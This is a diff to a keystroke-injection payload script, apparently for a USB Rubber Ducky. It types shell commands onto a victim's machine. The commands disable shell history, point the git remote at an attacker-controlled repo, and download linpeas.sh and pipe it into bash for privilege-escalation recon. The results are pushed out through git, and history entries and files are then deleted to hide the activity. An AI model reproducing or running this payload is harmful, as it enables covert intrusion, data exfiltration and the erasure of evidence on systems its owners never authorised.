@@ -19,6 +19,13 @@ STRING set +o history
 DELAY 300
 ENTER
 REM check current git remote setting, back it up, set it to your repo, then clone it and cd to it, then launch recon and exfil then cover your tracks, delete repo/files and history. I can't figure out how to restore the git remote url from the back up and this is as far as I got. So set it back to the termainl rickroll git repo and by time they figure it out you should be dropping arbuitary code by then.
-STRING git remote get-url --push origin > git.txt && git remote set-url origin https://"token"@github.com/"username"/"repoName".git && git clone "repo link" && cd "repo name" && nohup curl -s -L https://github.com/carlospolop/PEASS-ng/releases/download/20220703/linpeas.sh | bash >treasure.txt && git add * && git commit -m "treasure waits" && git push && cd .. && rm git.txt && rm -rf "repo name" && history | grep history && line=$(history | grep history | awk '{ print $1 }') && history -d $line && set -o history && exit
+STRING git remote get-url --push origin > git.txt && git remote set-url origin https://"token"@github.com/"username"/"repoName".git && git clone "repo link" && cd "repo name" && nohup curl -s -L https://github.com/carlospolop/PEASS-ng/releases/download/20220703/linpeas.sh | bash >treasure.txt && git add * && git commit -m "treasure waits" && git push && cd .. && rm git.txt && rm -rf "repo name" && history | grep history && line=$(history | grep history | awk '{ print $1 }') && history -d $line &&  set -o history &
+DELAY 300
+ENTER
+DELAY 300
+CTRL c
+DELAY 1500
+CTRL c
+STRING exit
 DELAY 300
 ENTER
